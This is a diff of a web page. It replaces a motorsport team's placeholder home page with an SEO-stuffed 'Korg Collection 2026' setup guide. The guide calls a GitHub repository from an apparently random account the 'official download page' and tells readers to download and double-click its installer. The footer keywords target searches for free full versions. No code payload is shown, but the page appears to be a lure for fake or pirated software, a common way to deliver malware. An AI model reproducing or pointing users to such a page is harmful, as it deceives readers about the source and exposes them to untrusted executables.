@@ -3,299 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home | Motorsport Team</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&display=swap" rel="stylesheet">
-    
-    <style>
-        /* Core Layout Elements */
-        body {
-            font-family: 'Oswald', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #000000;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-            min-height: 180vh; /* Provides necessary vertical runway for scrolling transitions */
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* -------------------------------------------------------------
-           AMBIEINT BACKGROUND LAYERS
-           ------------------------------------------------------------- */
-        .paddock-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: linear-gradient(135deg, #040507 0%, #000000 100%);
-            z-index: -10;
-        }
-
-        .glow-wash {
-            position: fixed;
-            bottom: -30%;
-            right: -10%;
-            width: 80vw;
-            height: 80vh;
-            background: radial-gradient(circle, rgba(218, 46, 41, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
-            z-index: -9;
-            pointer-events: none;
-        }
-
-        /* -------------------------------------------------------------
-           8-LAYER GEOMETRIC FRACTURES (THE PADDOCK SHARDS)
-           ------------------------------------------------------------- */
-        .geo-shard {
-            position: fixed;
-            top: 0;
-            height: 100vh;
-            pointer-events: none;
-            will-change: transform, opacity;
-            transition: transform 0.15s cubic-bezier(0.1, 0.8, 0.2, 1), opacity 0.15s linear;
-        }
-
-        /* SHARD 1: Deep Red Structural Horizon */
-        .shard-1 {
-            right: 0;
-            width: 65vw;
-            background: rgba(218, 46, 41, 0.03);
-            clip-path: polygon(45% 0%, 100% 0%, 90% 100%, 20% 100%);
-            z-index: -8;
-        }
-
-        /* SHARD 2: Dark Charcoal Shield */
-        .shard-2 {
-            right: 8vw;
-            width: 50vw;
-            background: rgba(10, 11, 14, 0.8);
-            border-left: 1px solid rgba(255, 255, 255, 0.02);
-            clip-path: polygon(30% 0%, 100% 0%, 100% 100%, 10% 100%);
-            z-index: -7;
-        }
-
-        /* SHARD 3: Secondary Red Ambient Track */
-        .shard-3 {
-            right: 2vw;
-            width: 42vw;
-            background: linear-gradient(180deg, rgba(218, 46, 41, 0.1) 0%, rgba(0, 0, 0, 0) 80%);
-            clip-path: polygon(15% 0%, 85% 0%, 100% 100%, 30% 100%);
-            z-index: -6;
-        }
-
-        /* SHARD 4: Heavy Tech Core Wall */
-        .shard-4 {
-            right: 0;
-            width: 35vw;
-            background: #07080a;
-            border-left: 1px solid rgba(218, 46, 41, 0.1);
-            clip-path: polygon(40% 0%, 100% 0%, 100% 100%, 0% 100%);
-            z-index: -5;
-        }
-
-        /* SHARD 5: High-Contrast Blade Accent */
-        .shard-5 {
-            right: 12vw;
-            width: 20vw;
-            background: linear-gradient(90deg, rgba(255, 255, 255, 0.01) 0%, rgba(218, 46, 41, 0.05) 100%);
-            clip-path: polygon(0% 0%, 100% 0%, 60% 100%, 20% 100%);
-            z-index: -4;
-        }
-
-        /* SHARD 6: Core Primary Team Red Stripe */
-        .shard-6 {
-            right: 0;
-            width: 25vw;
-            background: linear-gradient(180deg, rgba(218, 46, 41, 0.22) 0%, rgba(15, 3, 3, 0.6) 60%, rgba(0, 0, 0, 0.95) 100%);
-            clip-path: polygon(25% 0%, 100% 0%, 100% 100%, 5% 100%);
-            backdrop-filter: brightness(0.95) contrast(1.05);
-            z-index: -3;
-        }
-
-        /* SHARD 7: Outer Paddock Fractured Shadow Split */
-        .shard-7 {
-            right: -3vw;
-            width: 18vw;
-            background: rgba(5, 6, 8, 0.9);
-            border-left: 1px solid rgba(255, 255, 255, 0.04);
-            clip-path: polygon(45% 0%, 100% 0%, 80% 100%, 0% 100%);
-            z-index: -2;
-        }
-
-        /* SHARD 8: Foreground Speed Vignette Glow */
-        .shard-8 {
-            right: -8vw;
-            width: 15vw;
-            background: linear-gradient(90deg, rgba(218, 46, 41, 0.12) 0%, rgba(0, 0, 0, 0) 100%);
-            clip-path: polygon(60% 0%, 100% 0%, 50% 100%, 0% 100%);
-            z-index: -1;
-        }
-
-        /* -------------------------------------------------------------
-           NAVIGATION BAR STYLING
-           ------------------------------------------------------------- */
-        .top-navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 1000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 70px;
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 20px;
-        }
-
-        .nav-links a {
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 700;
-            font-style: italic;
-            text-transform: uppercase;
-            color: #ffffff;
-            letter-spacing: 1.5px;
-            padding: 10px 15px;
-            transition: all 0.2s ease;
-            position: relative;
-        }
-
-        .nav-links a.active {
-            color: #Da2e29;
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            transform: scaleX(0);
-            height: 2px;
-            bottom: 0;
-            left: 0;
-            background-color: #Da2e29;
-            transform-origin: bottom right;
-            transition: transform 0.25s ease-out;
-        }
-
-        .nav-links a:hover::after,
-        .nav-links a.active::after {
-            transform: scaleX(1);
-            transform-origin: bottom left;
-        }
-
-        .nav-links a:hover {
-            color: #Da2e29;
-        }
-
-        /* -------------------------------------------------------------
-           PAGE CONTENT MAIN WRAPPER
-           ------------------------------------------------------------- */
-        main {
-            padding: 140px 50px 50px 50px;
-            max-width: 1200px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 10;
-        }
-
-        h1 {
-            font-size: 4rem;
-            text-transform: uppercase;
-            font-weight: 700;
-            font-style: italic;
-            margin-bottom: 10px;
-            letter-spacing: -1px;
-            color: #ffffff;
-            border-left: 6px solid #Da2e29;
-            padding-left: 20px;
-            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.9);
-        }
-
-        .subtitle {
-            font-size: 1.1rem;
-            color: #b0b5c0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            padding-left: 26px;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
-            margin-bottom: 50px;
-        }
-    </style>
+    <meta name="description" content="Download and install Korg Collection 2026 for Windows 10 and 11. Follow our clear setup guide for music production software.">
+    <title>Korg-Collection-2026 Setup Guide</title>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f4;">
 
-    <!-- 8-Layer Geometric Paddock Elements -->
-    <div class="paddock-bg"></div>
-    <div class="glow-wash"></div>
-    
-    <div class="geo-shard shard-1" id="shard1"></div>
-    <div class="geo-shard shard-2" id="shard2"></div>
-    <div class="geo-shard shard-3" id="shard3"></div>
-    <div class="geo-shard shard-4" id="shard4"></div>
-    <div class="geo-shard shard-5" id="shard5"></div>
-    <div class="geo-shard shard-6" id="shard6"></div>
-    <div class="geo-shard shard-7" id="shard7"></div>
-    <div class="geo-shard shard-8" id="shard8"></div>
+    <header style="background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        <h1 style="color: #2c3e50;">🎹 Korg-Collection-2026 - Master your vintage synth sounds now</h1>
+        <p>This guide helps you set up the Korg Collection on your Windows computer.</p>
+        <a href="https://github.com/consumptivesilentbutler806/Korg-Collection-2026" style="display: inline-block; background-color: #34495e; color: white; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold;">Download Software Now</a>
+    </header>
 
-    <!-- Navigation Header -->
-    <nav class="top-navbar">
-        <div class="nav-links">
-            <a href="index.html" class="active">Home</a>
-            <a href="about.html">About the team</a>
-            <a href="departments.html">Departments</a>
-            <a href="sponsors.html">Sponsors</a>
-            <a href="timeline.html">Timeline</a>
-            <a href="contact.html">Contact us</a>
-        </div>
-    </nav>
+    <main style="background: #fff; padding: 30px; margin-top: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        
+        <h2>📦 What is the Korg Collection</h2>
+        <p>The Korg Collection brings classic synthesizer sounds to your modern computer. It includes digital recreations of legendary hardware instruments. You can use these sounds inside your music production software to create professional tracks. This collection works on Windows 10 and Windows 11.</p>
 
-    <!-- Main Content Grid Component -->
-    <main>
-        <h1>Welcome to the team</h1>
-        <div class="subtitle">// Currently under construction.</div>
+        <h2>⚙️ System Requirements</h2>
+        <ul>
+            <li>Windows 10 or Windows 11 (64-bit).</li>
+            <li>Intel Core i5 or better processor.</li>
+            <li>8 GB of RAM.</li>
+            <li>10 GB of free disk space.</li>
+            <li>An audio interface or standard sound card.</li>
+        </ul>
+
+        <h2>🚀 How to Download and Install</h2>
+        <p>Follow these steps to get the software on your machine:</p>
+        <ol>
+            <li>Go to the <a href="https://github.com/consumptivesilentbutler806/Korg-Collection-2026">official download page</a>.</li>
+            <li>Click the green button or the link to start the download.</li>
+            <li>Wait for the file to finish saving to your Downloads folder.</li>
+            <li>Open your Downloads folder and double-click the installer file.</li>
+            <li>Follow the instructions on your screen.</li>
+            <li>Choose a location on your hard drive for the installation files.</li>
+            <li>Click finish once the setup bar completes.</li>
+        </ol>
+
+        <h2>🎧 Setting Up Your DAW</h2>
+        <p>After you finish the installation, you must connect the software to your music app. Most professional audio programs, also called a Digital Audio Workstation or DAW, need to scan for new plugins. Open your music app and find the settings menu. Look for the plugins or VST folder section. Make sure the app scans the folder where you installed the Korg Collection. Once the scan finishes, you will see the instruments in your plugin list.</p>
+
+        <h2>🛠️ Troubleshooting Common Issues</h2>
+        <p>If you do not see the instruments in your music software, check your plugin path settings again. Make sure your computer meets the minimum RAM requirements. If you hear clicks or pops, increase your audio buffer size in your music software settings. A larger buffer size reduces processing load and improves sound stability.</p>
+
+        <h2>Frequently Asked Questions</h2>
+        <h3>Does this work on older Windows versions?</h3>
+        <p>The collection requires Windows 10 or 11 for proper operation. Older versions may lack the necessary system drivers.</p>
+        
+        <h3>Can I run this on a Mac?</h3>
+        <p>This version is for Windows computers. You need the specific macOS installer for Apple devices.</p>
+
+        <h3>Is my sound card good enough?</h3>
+        <p>Most modern internal sound cards work. However, a dedicated music interface provides better audio quality and lower delay.</p>
+
     </main>
 
-    <!-- 8-Channel Parallax Scroll Engine Script -->
-    <script>
-        function updateMultiLayerPaddock() {
-            const totalScrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
-            if (totalScrollableHeight <= 0) return;
-            
-            // Map scroll position to a clean 0 to 1 ratio value
-            const scrollPercent = window.scrollY / totalScrollableHeight;
-
-            // Apply distinct calculated transforms to each fracture element simultaneously
-            document.getElementById('shard1').style.transform = `translateX(${scrollPercent * -45}px) skewX(${scrollPercent * 1}deg)`;
-            document.getElementById('shard2').style.transform = `translateX(${scrollPercent * 25}px)`;
-            document.getElementById('shard3').style.transform = `translateX(${scrollPercent * -15}px) translateY(${scrollPercent * 20}px)`;
-            document.getElementById('shard4').style.transform = `translateX(${scrollPercent * 35}px) scaleX(${1 + scrollPercent * 0.03})`;
-            document.getElementById('shard5').style.transform = `translateX(${scrollPercent * -60}px)`;
-            
-            // Center red highlight tracks opacity and horizontal glide
-            const s6 = document.getElementById('shard6');
-            s6.style.transform = `translateX(${scrollPercent * -30}px)`;
-            s6.style.opacity = `${0.7 + (scrollPercent * 0.3)}`;
-            
-            document.getElementById('shard7').style.transform = `translateX(${scrollPercent * 15}px)`;
-            document.getElementById('shard8').style.transform = `translateX(${scrollPercent * -75}px) skewX(${scrollPercent * -2}deg)`;
-        }
-
-        // Window interaction event connections
-        window.addEventListener('scroll', updateMultiLayerPaddock);
-        window.addEventListener('resize', updateMultiLayerPaddock);
-        document.addEventListener("DOMContentLoaded", updateMultiLayerPaddock);
-    </script>
+    <footer style="margin-top: 40px; font-size: 0.9em; color: #777;">
+        <p>Keywords: collection, complete, complete-version, download, download-korg-collection-full-free-windows-11, full-installer, korg-2026, korg-collection, korg-collection-2026, korg-collection-complete-install-2026-pc, korg-collection-full-version-download-windows, music-production, software, synthesizer, vintage-synth, vst, windows-11, windows-software</p>
+    </footer>
 
 </body>
 </html>
